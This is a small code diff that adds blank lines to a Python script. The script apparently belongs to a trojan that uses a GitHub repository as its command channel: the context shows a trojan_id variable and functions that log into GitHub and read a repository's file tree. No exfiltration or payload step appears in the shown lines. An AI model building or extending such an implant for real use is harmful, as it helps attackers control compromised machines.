@@ -9,6 +9,7 @@ from threading import Thread
 import Queue
 # import os
 
+
 from github3 import login
 
 trojan_id = "abc"
@@ -31,6 +32,7 @@ def connect_to_github():
 def get_file_contents(filepath):
 
     gh, repo, branch = connect_to_github()
+
     tree = branch.commit.commit.tree.recurse()
 
     for filename in tree.tree:
